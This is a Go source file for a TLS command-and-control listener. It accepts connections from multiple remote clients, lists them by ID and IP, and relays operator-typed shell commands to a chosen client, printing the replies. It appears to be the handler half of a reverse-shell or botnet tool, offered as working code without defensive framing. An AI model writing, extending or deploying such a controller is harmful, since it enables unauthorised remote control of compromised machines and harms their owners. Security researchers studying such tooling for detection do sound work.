package main

import (
	"bufio"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"
)

type Client struct {
	conn net.Conn
	id   int
	ip   string
}

var (
	clients   = make(map[int]Client)
	clientsMu sync.Mutex
	clientIDs = 0
	activeListener = -1
	stopListening  = make(chan bool, 1)
)

func main() {
	// Load TLS certificates
	cert, err := tls.LoadX509KeyPair("cert.pem", "key.pem")
	if err != nil {
		fmt.Println("Error loading certificate:", err)
		return
	}

	config := &tls.Config{Certificates: []tls.Certificate{cert}}
	listener, err := tls.Listen("tcp", ":8080", config)
	if err != nil {
		fmt.Println("Error starting server:", err)
		return
	}
	defer listener.Close()

	fmt.Println("Server started on port 8080. Waiting for connections...")

	go acceptClients(listener)
	menu()
}

func acceptClients(listener net.Listener) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting client connection:", err)
			continue
		}

		clientsMu.Lock()
		clientID := clientIDs
		clientIP := conn.RemoteAddr().String()
		clients[clientID] = Client{conn, clientID, clientIP}
		clientIDs++
		clientsMu.Unlock()

		fmt.Printf("New client %d connected: %s\n", clientID, clientIP)

		// Start handling the client in a separate goroutine
		go handleClient(conn, clientID, clientIP)
	}
}

func menu() {
	for {
		clientsMu.Lock()
		fmt.Println("Connected clients:")
		for id, client := range clients {
			fmt.Printf("ID: %d, IP: %s\n", id, client.ip)
		}
		clientsMu.Unlock()

		fmt.Print("Enter client ID to interact ('q' to quit): ")
		scanner := bufio.NewScanner(os.Stdin)
		scanner.Scan()
		input := scanner.Text()

		if input == "q" {
			return
		}

		id, err := strconv.Atoi(input)
		if err == nil {
			clientsMu.Lock()
			_, exists := clients[id]
			clientsMu.Unlock()

			if exists {
				if activeListener != -1 {
					stopListening <- true
				}
				activeListener = id
				listenToClient(id)
			} else {
				fmt.Println("Client with this ID not found.")
			}
		} else {
			fmt.Println("Invalid input, please try again.")
		}
	}
}

func listenToClient(id int) {
	clientsMu.Lock()
	client, exists := clients[id]
	clientsMu.Unlock()

	if !exists {
		fmt.Println("Client with this ID not found.")
		return
	}

	fmt.Printf("Listening to client %d (IP: %s)\n", id, client.ip)

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Printf("[Client %d] Enter command ('shell-exit' to exit): ", id)
		scanner.Scan()
		command := scanner.Text()

		if command == "shell-exit" {
			fmt.Println("Exiting interaction mode with client.")
			stopListening <- true
			activeListener = -1
			return
		}

		_, err := client.conn.Write([]byte(command + "\n"))
		if err != nil {
			fmt.Println("Error sending command:", err)
			clientsMu.Lock()
			delete(clients, id)
			clientsMu.Unlock()
			return
		}
	}
}

func handleClient(conn net.Conn, clientID int, clientIP string) {
	defer func() {
		conn.Close()
		clientsMu.Lock()
		delete(clients, clientID)
		clientsMu.Unlock()
		fmt.Printf("Client %d (IP: %s) disconnected and removed from list.\n", clientID, clientIP)
	}()

	for {
		var length int32
		err := binary.Read(conn, binary.LittleEndian, &length)
		if err != nil {
			return
		}

		response := make([]byte, length)
		_, err = conn.Read(response)
		if err != nil {
			return
		}

		fmt.Printf("Response from client %d (IP: %s):\n%s\n", clientID, clientIP, string(response))
	}
}